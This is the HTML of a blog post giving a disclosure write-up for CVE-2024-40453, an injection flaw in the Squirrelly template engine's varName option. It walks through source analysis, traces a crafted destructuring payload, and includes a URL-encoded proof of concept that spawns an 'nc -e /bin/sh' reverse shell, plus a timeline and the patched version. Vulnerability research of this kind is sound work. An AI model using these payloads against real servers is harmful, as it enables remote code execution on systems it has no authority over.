<!DOCTYPE html><html lang="en" data-astro-cid-sckkx6r4 data-astro-transition-scope="astro-smooz4hq-1"> <head><!-- browser stuff --><title>Squirrelly v9.0.0 RCE (CVE-2024-40453)</title><link rel="icon" type="image/x-icon" href="/favicon.ico" sizes="192x192"><link rel="apple-touch-icon" type="image/x-icon" href="/favicon.ico"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico"><!-- meta --><meta charset="UTF-8"><meta name="description" content="samuzora's blog - ctf stuff and more"><meta name="keywords" content="ctf pwn web cves exploit cybersecurity kernel writeup"><meta name="author" content="samuzora"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#1e1e1e"><!-- fonts --><link rel="preload" href="https://fonts.cdnfonts.com/css/chillax" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="https://fonts.cdnfonts.com/css/chillax"></noscript><link rel="preload" href="https://fonts.cdnfonts.com/css/fredoka" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="https://fonts.cdnfonts.com/css/fredoka"></noscript><link rel="preload" href="/css/fontawesome/fontawesome.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="/css/fontawesome/fontawesome.min.css"></noscript><link rel="preload" href="/css/fontawesome/regular.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="/css/fontawesome/regular.min.css"></noscript><link rel="preload" href="/css/fontawesome/brands.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="/css/fontawesome/brands.min.css"></noscript><!-- <link rel="preconnect" href="https://fonts.googleapis.com" /> --><!-- <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /> --><!-- <link rel="stylesheet" href="/css/fontawesome/all.min.css"> --><!-- <link rel="stylesheet" href="/css/fontawesome/thin.min.css"> --><!-- <link rel="stylesheet" href="/css/fontawesome/light.min.css"> --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/simple-scrollbar@latest/simple-scrollbar.css"><!-- TODO: configure cdn --><!-- seo --><meta name="robots" content="index, follow"><meta name="googlebot" content="index, follow"><meta name="revisit after" content="1 days"><link rel="sitemap" href="/sitemap-index.sml"><!-- sns stuff --><meta property="og:type" content="website"><meta property="og:title" content="Squirrelly v9.0.0 RCE (CVE-2024-40453)"><meta property="og:site_name" content="Squirrelly v9.0.0 RCE (CVE-2024-40453)"><meta property="og:description" content="samuzora's blog - ctf stuff and more"><meta property="og:locale" content="en_SG"><meta property="article:author" content="samuzora"><meta property="article:tag" content="ctf pwn web cves exploit cybersecurity kernel writeup"><meta property="twitter:card" content="summary"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/_astro/_selectedYear_.CHqKQQ07.css">
<style>a:hover{color:var(--first-text-color)}
</style><script type="module" src="/_astro/hoisted.B-6fqYov.js"></script><style>[data-astro-transition-scope="astro-smooz4hq-1"] { view-transition-name: astro-smooz4hq-1; }@layer astro { ::view-transition-old(astro-smooz4hq-1) { animation: none; opacity: 0; mix-blend-mode: normal; }::view-transition-new(astro-smooz4hq-1) { animation: none; mix-blend-mode: normal; }::view-transition-group(astro-smooz4hq-1) { animation: none } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { animation: none; mix-blend-mode: normal; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { animation: none; mix-blend-mode: normal; }</style><style>[data-astro-transition-scope="astro-v7oxkvg4-2"] { view-transition-name: astro-v7oxkvg4-2; }@layer astro { ::view-transition-old(astro-v7oxkvg4-2) { 
	animation-duration: 90ms, 220ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1), cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both, both;
	animation-name: astroFadeOut, astroSlideToLeft; }::view-transition-new(astro-v7oxkvg4-2) { 
	animation-duration: 210ms, 220ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1), cubic-bezier(0.76, 0, 0.24, 1);
	animation-delay: 30ms;
	animation-fill-mode: both, both;
	animation-name: astroFadeIn, astroSlideFromRight; }[data-astro-transition=back]::view-transition-old(astro-v7oxkvg4-2) { 
	animation-name: astroFadeOut, astroSlideToRight; }[data-astro-transition=back]::view-transition-new(astro-v7oxkvg4-2) { 
	animation-name: astroFadeIn, astroSlideFromLeft; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-v7oxkvg4-2"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-v7oxkvg4-2"] { 
	animation-duration: 90ms, 220ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1), cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both, both;
	animation-name: astroFadeOut, astroSlideToLeft; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-v7oxkvg4-2"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-v7oxkvg4-2"] { 
	animation-duration: 210ms, 220ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1), cubic-bezier(0.76, 0, 0.24, 1);
	animation-delay: 30ms;
	animation-fill-mode: both, both;
	animation-name: astroFadeIn, astroSlideFromRight; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-v7oxkvg4-2"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-v7oxkvg4-2"] { 
	animation-name: astroFadeOut, astroSlideToRight; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-v7oxkvg4-2"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-v7oxkvg4-2"] { 
	animation-name: astroFadeIn, astroSlideFromLeft; }</style></head> <body data-astro-cid-sckkx6r4> <div class="relative min-h-screen" data-astro-cid-sckkx6r4> <div class="pb-[200px]" data-astro-cid-sckkx6r4> <div data-home-background class="home-banner-background transition fixed top-0 left-0 w-screen h-screen scale-125 sm:scale-110 bg-cover blur" data-astro-cid-sckkx6r4></div> <div class="header fixed flex justify-between top-0 left-0 z-50 w-full px-5 md:px-10 lg:px-10 backdrop-blur-lg" data-astro-cid-sckkx6r4> <div class="my-auto hidden md:block text-[28px] font-[500]" data-astro-cid-sckkx6r4> <a href="/" data-astro-cid-sckkx6r4>samuzora.com</a> </div> <div class="flex gap-10 text-[20px] my-auto" data-astro-cid-sckkx6r4> <a class="nav text-[15px] md:text-[18px] align-middle" href="/" data-astro-cid-sckkx6r4="true"><!--[--> <i class="fa-regular fa-home" data-astro-cid-sckkx6r4></i>
HOME
<!--]--></a> <a class="nav text-[15px] md:text-[18px] align-middle" href="/browse" data-astro-cid-sckkx6r4="true"><!--[--> <i class="fa-regular fa-archive" data-astro-cid-sckkx6r4></i>
BLOG
<!--]--></a> </div> </div> <!-- main content --> <div data-astro-cid-sckkx6r4 data-astro-transition-scope="astro-v7oxkvg4-2">  <div class="relative flex justify-center pt-[125px] px-6 md:px-32 xl:px-16 mx-auto"> <div class="sticky lg:w-[125px] xl:w-[200px] self-start hidden lg:block mr-10 top-[125px] h-[calc(100vh-200px)] overflow-y-auto" ss-container> <div class="text-xl font-bold text-[--second-text-color] py-2">
Contents
</div> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();;(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="19QSqQ" prefix="v0" component-url="/_astro/Toc.BAC3ugyn.js" component-export="default" renderer-url="/_astro/client.raan2jJ3.js" props="{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;technical-details&quot;],&quot;text&quot;:[0,&quot;Technical details&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;initial-findings&quot;],&quot;text&quot;:[0,&quot;Initial findings&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;testing&quot;],&quot;text&quot;:[0,&quot;Testing&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;first-payload&quot;],&quot;text&quot;:[0,&quot;First payload&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;better-payloads&quot;],&quot;text&quot;:[0,&quot;Better payloads&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;timeline&quot;],&quot;text&quot;:[0,&quot;Timeline&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;remediation&quot;],&quot;text&quot;:[0,&quot;Remediation&quot;]}]]]}" ssr="" client="load" opts="{&quot;name&quot;:&quot;Toc&quot;,&quot;value&quot;:true}" await-children=""><div class="text-xs"><ul id="toc"><!--[--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#technical-details">Technical details</a></li><ul class="ml-3"><!--[--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#initial-findings">Initial findings</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#testing">Testing</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#first-payload">First payload</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#better-payloads">Better payloads</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--]--></ul><!--]--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#timeline">Timeline</a></li><ul class="ml-3"><!--[--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#remediation">Remediation</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--]--></ul><!--]--><!--]--></ul></div><!--astro:end--></astro-island> </div> <div data-main-content class="flex flex-col gap-10 min-w-[300px] md:w-[748px] lg:max-w-[904px] xl:max-w-[1300px]"> <div class="flex flex-col gap-2 relative"> <div class="card p-5 rounded-lg backdrop-blur-lg !bg-[--primary-bg] items-center rounded-none md:rounded-lg -mx-6 md:mx-0 p-10"><!--[--> <div class="pb-10"> <astro-island uid="a35Ku" prefix="v1" component-url="/_astro/PostHeader.BmI7ZjWB.js" component-export="default" renderer-url="/_astro/client.raan2jJ3.js" props="{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;cve-2024-40453.md&quot;],&quot;slug&quot;:[0,&quot;cve-2024-40453&quot;],&quot;body&quot;:[0,&quot;\nThis is a writeup for CVE-2024-40453.\n\n# Technical details\n\n## Initial findings\n\nWhen looking through the Squirrelly source code, [OwOverflow](https://github.com/molangning) pointed out this segment of code in\n[`src/compile-string.ts`](https://github.com/squirrellyjs/squirrelly/blob/5eae86154a03d0716c2525ab9e50d9adb318abe6/src/compile-string.ts#L17)\nto me:\n\n```javascript\n  var res =\n    \&quot;var tR=&#39;&#39;;\&quot; +\n    (env.useWith ? &#39;with(&#39; + env.varName + &#39;||{}){&#39; : &#39;&#39;) +\n    compileScope(buffer, env) +\n    &#39;if(cb){cb(null,tR)} return tR&#39; +\n    (env.useWith ? &#39;}&#39; : &#39;&#39;)\n```\n\n(`env` is the `options` parameter passed to the `render` function)\n\nAfter following the complete function call chain (`render -&gt; handleCache -&gt; compile -&gt; compileString`), I found that the\n`env.varName` parameter is indeed not sanitized. At first glance, this seems like an easy way to inject arbitrary JS and\nget RCE server-side. In order to get this exploit to work, the attacker should set `env.useWith` so that `env.varName`\nis injected.\n\nThe `with` expression is an almost-deprecated Javascript feature that allows you to execute a block of code, appending\nan object to the global scope chain. This is demonstrated below:\n\n```javascript\nwith (\&quot;asdf\&quot;) {\n    console.log(toString()) // logs \&quot;asdf\&quot;\n}\n```\n\nHowever, what is important is that we can inject an arbitrary expression into the `with` argument. This can easily allow\nus to get RCE! A simple payload would be:\n\n```javascript\n// options.varName = &#39;console.log(\&quot;x\&quot;)&#39;\nwith (console.log(\&quot;x\&quot;) || {}) {\n    // ...\n}\n```\n\nThis should execute the `console.log(\&quot;x\&quot;)` statement and give us RCE.\n\n## Testing\n\nWe can set up a simple server to test this out.\n\n```javascript\nconst express = require(\&quot;express\&quot;)\n\nconst PORT = 3000\n\nconst app = express()\napp.set(\&quot;view engine\&quot;, \&quot;squirrelly\&quot;)\n\napp.get(\&quot;/\&quot;, (req, res) =&gt; {\n  res.render(\&quot;asdf\&quot;, req.query)\n})\n\napp.listen(3000, () =&gt; {\n  console.log(`Server is running at port ${PORT}`)\n})\n```\n\nVisiting the following URL to execute our payload:\n\n```\nhttp://localhost:3000?useWith=1&amp;varName=console.log(\&quot;x\&quot;)\n```\n\nHowever, if we try to do this, we get the following error:\n\n```\nSquirrelly Error: Bad template syntax\n\nArg string terminates parameters early\n======================================\nvar tR=&#39;&#39;;tR+=&#39;asdf\\n&#39;;if(cb){cb(null,tR)} return tR\n    at SqrlErr (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:138:15)\n    at compile (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:881:19)\n    at handleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1002:12)\n    at tryHandleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1035:13)\n    at View.renderFile [as engine] (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1064:12)\n    at View.render (/home/samuzora/test/node_modules/express/lib/view.js:135:8)\n    at tryRender (/home/samuzora/test/node_modules/express/lib/application.js:657:10)\n    at Function.render (/home/samuzora/test/node_modules/express/lib/application.js:609:3)\n    at ServerResponse.render (/home/samuzora/test/node_modules/express/lib/response.js:1048:7)\n    at /home/samuzora/test/index.js:9:7\n```\n\nWhat does this mean? Searching for the error message, we can see the error being raised at\n[`src/compile.ts:44`](https://github.com/squirrellyjs/squirrelly/blob/5eae86154a03d0716c2525ab9e50d9adb318abe6/src/compile.ts#L44):\n\n```javascript\n  try {\n    return new ctor(\n      options.varName,\n      &#39;c&#39;, // SqrlConfig\n      &#39;cb&#39;, // optional callback\n      compileToString(str, options)\n    ) as TemplateFunction // eslint-disable-line no-new-func\n  } catch (e) {\n    if (e instanceof SyntaxError) {\n      throw SqrlErr(\n        &#39;Bad template syntax\\n\\n&#39; +\n          e.message +\n          &#39;\\n&#39; +\n          Array(e.message.length + 1).join(&#39;=&#39;) +\n          &#39;\\n&#39; +\n          compileToString(str, options)\n      )\n  } else {\n      throw e\n  }\n```\n\nThe `options.varName` parameter is being passed to the `ctor` function (which is just a `Function` constructor). The\n`Function` constructor takes in `n+1` arguments, where the first `n` arguments are parameters of the function to be\ncreated, and the last argument is the function body. That&#39;s what&#39;s causing our error, since we&#39;re passing\n`console.log(\&quot;x\&quot;)` into the parameter field. This means our injection occurs in the first parameter of the new function\nbeing created, and should be a valid JS expression that can be passed in a parameter declaration. And our payload should\nstill execute as per normal in the `with` expression.\n\n## First payload\n\nJavascript allows for parameters to be destructured in the function definition like so:\n\n\n```javascript\nfunction f({ a }) {\n    console.log(a)\n    // ...\n}\n```\n\nThis is done through object destructuring. It&#39;s quite flexible and also allows for default values to be set:\n\n```javascript\nfunction f({ a = 1 }) {\n    console.log(a)\n}\n```\n\nThis is the vector for our RCE. When setting the default value, the expression has to be evaluated, which we can use for\nRCE. Something like this should work:\n\n```javascript\nfunction f({ a = console.log(\&quot;x\&quot;) }) {\n    console.log(a)\n}\n```\n\nHowever, there&#39;s a small problem - our payload is also being injected in the `with` expression, and this syntax is\ninvalid there since it&#39;s not a valid object initializer.\n\n```javascript\nwith ({ a = console.log(\&quot;x\&quot;) } || {}) {\n    // ...\n}\n```\n\nIndeed, when we try this payload, it crashes as well:\n\n```\nSquirrelly Error: Bad template syntax\n\nInvalid shorthand property initializer\n======================================\nvar tR=&#39;&#39;;with({a=console.log(\&quot;X\&quot;)}||{}){tR+=&#39;asdf\\n&#39;;if(cb){cb(null,tR)} return tR}\n    at SqrlErr (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:138:15)\n    at compile (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:881:19)\n    at handleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1002:12)\n    at tryHandleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1035:13)\n    at View.renderFile [as engine] (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1064:12)\n    at View.render (/home/samuzora/test/node_modules/express/lib/view.js:135:8)\n    at tryRender (/home/samuzora/test/node_modules/express/lib/application.js:657:10)\n    at Function.render (/home/samuzora/test/node_modules/express/lib/application.js:609:3)\n    at ServerResponse.render (/home/samuzora/test/node_modules/express/lib/response.js:1048:7)\n    at /home/samuzora/test/index.js:9:7\n```\n\nLuckily, according to the\n[docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment), the destructuring syntax is quite flexible and allows for a lot more kinds of syntax:\n\n```javascript\nconst [a, b] = array;\nconst [a, , b] = array;\nconst [a = aDefault, b] = array;\nconst [a, b, ...rest] = array;\nconst [a, , b, ...rest] = array;\nconst [a, b, ...{ pop, push }] = array;\nconst [a, b, ...[c, d]] = array;\n\nconst { a, b } = obj;\nconst { a: a1, b: b1 } = obj;\nconst { a: a1 = aDefault, b = bDefault } = obj;\nconst { a, b, ...rest } = obj;\nconst { a: a1, b: b1, ...rest } = obj;\nconst { [key]: a } = obj;\n\nlet a, b, a1, b1, c, d, rest, pop, push;\n[a, b] = array;\n[a, , b] = array;\n[a = aDefault, b] = array;\n[a, b, ...rest] = array;\n[a, , b, ...rest] = array;\n[a, b, ...{ pop, push }] = array;\n[a, b, ...[c, d]] = array;\n\n({ a, b } = obj); // parentheses are required\n({ a: a1, b: b1 } = obj);\n({ a: a1 = aDefault, b = bDefault } = obj);\n({ a, b, ...rest } = obj);\n({ a: a1, b: b1, ...rest } = obj);\n```\n\nThe most interesting syntax is this:\n\n```javascript\n({ a: a1 = aDefault, b = bDefault } = obj);\n```\n\nIt takes the value corresponding to the `a1` key in `obj`, and assigns it to `a`. If `a1` is not defined then it\nevaluates `aDefault`\n\nWith this syntax, we can satisfy the `with` expression since it&#39;s now a valid object initializer. It also satisfies the\n`Function` constructor since it&#39;s simply assigning the value to a different name. So we can use this for RCE!\n\n```javascript\n// valid!\nwith ({ a: b = console.log(\&quot;x\&quot;) } || {}) {\n    // ...\n}\n\n// valid!\nnew Function(\&quot;{ a: b = console.log(&#39;x&#39;) }\&quot;, \&quot;c\&quot;, \&quot;cb\&quot;, \&quot;return 1\&quot;)\n```\n\nLet&#39;s test out our payload with a reverse shell:\n\n```\nPayload: { a: b = global.process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;nc -e /bin/sh localhost 1337\&quot;) }\n\nhttp://localhost:3000?useWith=1&amp;varName=%7B%20a:%20b%20=%20global.process.mainModule.require(%22child_process%22).execSync(%22nc%20-e%20/bin/sh%20localhost%201337%22)%20%7D\n```\n\nAnd we have RCE!\n\n![Reverse shell](@images/2024/cve-2024-40453/reverse-shell.png)\n\n## Better payloads\n\nIn the process of writing the report, I realized that there are easier payloads that can be used:\n\n```javascript\n[ a = console.log(\&quot;x\&quot;) ]\n```\n\nThis payload is valid in both the `with` expression and the `Function` constructor.\n\n```javascript\n// don&#39;t set useWith=1\n{ a = console.log(\&quot;x\&quot;) }\n```\n\nWith this payload, we can just bypass the `with` expression entirely, and just inject the payload into the `Function`\nconstructor.\n\n# Timeline\n\nNote: When I first requested the CVE ID, I put my Gmail as the contact email, but didn&#39;t receive any response. I&#39;m\npretty sure that Gmail is blocking emails from `mitre.org` which can&#39;t be disabled, so I re-requested the CVE with\nOutlook.\n\n- _First discovery_: 28 May 2024\n- _Reported to maintainer Ben Gubler_: 28 May 2024\n- _CVE ID requested_: 30 May 2024\n- _CVE ID re-requested_: 1 Jul 2024\n- _Fix merged_: 2 Jul 2024\n- _CVE ID assigned_: 17 Jul 2024\n- _Public disclosure_: 18 Jul 2024\n- _CVE published_: 22 Aug 2024\n\n## Remediation\n\nThe vulnerability has been patched in v9.1.0.\n&quot;],&quot;collection&quot;:[0,&quot;blog&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Squirrelly v9.0.0 RCE (CVE-2024-40453)&quot;],&quot;date&quot;:[3,&quot;2024-07-17T00:00:00.000Z&quot;],&quot;excerpt&quot;:[0,&quot;RCE in Squirrelly v9.0.0 through attacker-controlled options&quot;],&quot;category&quot;:[0,&quot;CVEs&quot;],&quot;tags&quot;:[1,[[0,&quot;web&quot;]]]}],&quot;render&quot;:[0,null]}],&quot;remarkPluginFrontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Squirrelly v9.0.0 RCE (CVE-2024-40453)&quot;],&quot;date&quot;:[0,&quot;2024-07-17T00:00:00.000Z&quot;],&quot;excerpt&quot;:[0,&quot;RCE in Squirrelly v9.0.0 through attacker-controlled options&quot;],&quot;category&quot;:[0,&quot;CVEs&quot;],&quot;tags&quot;:[1,[[0,&quot;web&quot;]]],&quot;minutesRead&quot;:[0,&quot;6 min read&quot;]}]}" ssr="" client="load" opts="{&quot;name&quot;:&quot;PostHeader&quot;,&quot;value&quot;:true}" await-children=""><!--[--><div class="pt-5 pb-5 text-center text-3xl lg:text-4xl font-black">Squirrelly v9.0.0 RCE (CVE-2024-40453)</div><div><div class="flex gap-3"><div><img class="rounded-xl aspect-square w-14 border border-[--secondary-bg]" src="/assets/samuzora.png" alt="author"></div><div class="flex flex-col justify-around"><div> samuzora </div><div class="flex justify-start items-center gap-4 text-sm text-[--fourth-text-color]"><div class="flex items-center gap-1"><i class="fa-regular fa-pencil"></i> 17 Jul 2024</div><div class="hidden md:flex items-center gap-1"><i class="fa-regular fa-folder"></i> CVEs</div><div class="hidden lg:flex items-center gap-1"><i class="fa-regular fa-tags"></i> web</div><div class="flex items-center gap-1"><i class="fa-regular fa-clock"></i> 6 min read</div></div></div></div></div><!--]--><!--astro:end--></astro-island> </div> <details open class="lg:hidden group p-5 mb-5 border border-[--secondary-bg] rounded-lg"> <summary class="flex justify-between"> <div class="text-xl font-bold text-[--second-text-color] py-2">
Contents
</div> <i class="transition-all my-auto text-sm text-white fa-regular fa-chevron-down group-open:rotate-180"></i> </summary> <div ss-container class="h-[400px]"> <astro-island uid="19QSqQ" prefix="v2" component-url="/_astro/Toc.BAC3ugyn.js" component-export="default" renderer-url="/_astro/client.raan2jJ3.js" props="{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;technical-details&quot;],&quot;text&quot;:[0,&quot;Technical details&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;initial-findings&quot;],&quot;text&quot;:[0,&quot;Initial findings&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;testing&quot;],&quot;text&quot;:[0,&quot;Testing&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;first-payload&quot;],&quot;text&quot;:[0,&quot;First payload&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;better-payloads&quot;],&quot;text&quot;:[0,&quot;Better payloads&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;timeline&quot;],&quot;text&quot;:[0,&quot;Timeline&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;remediation&quot;],&quot;text&quot;:[0,&quot;Remediation&quot;]}]]]}" ssr="" client="load" opts="{&quot;name&quot;:&quot;Toc&quot;,&quot;value&quot;:true}" await-children=""><div class="text-xs"><ul id="toc"><!--[--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#technical-details">Technical details</a></li><ul class="ml-3"><!--[--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#initial-findings">Initial findings</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#testing">Testing</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#first-payload">First payload</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#better-payloads">Better payloads</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--]--></ul><!--]--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#timeline">Timeline</a></li><ul class="ml-3"><!--[--><!--[--><li class="list-inside py-0.5"><a class="transition-all break-words" href="#remediation">Remediation</a></li><ul class="ml-3"><!--[--><!--]--></ul><!--]--><!--]--></ul><!--]--><!--]--></ul></div><!--astro:end--></astro-island> </div> </details><div class="markdown-body"> <p>This is a writeup for CVE-2024-40453.</p>
<section><h1 id="technical-details">Technical details</h1><section><h2 id="initial-findings">Initial findings</h2><p>When looking through the Squirrelly source code, <a href="https://github.com/molangning">OwOverflow</a> pointed out this segment of code in
<a href="https://github.com/squirrellyjs/squirrelly/blob/5eae86154a03d0716c2525ab9e50d9adb318abe6/src/compile-string.ts#L17"><span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>src/compile-string.ts</span></span></code></span></a>
to me:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">  var</span><span style="color:#CDD6F4"> res </span><span style="color:#94E2D5">=</span></span>
<span data-line=""><span style="color:#A6E3A1">    "var tR='';"</span><span style="color:#94E2D5"> +</span></span>
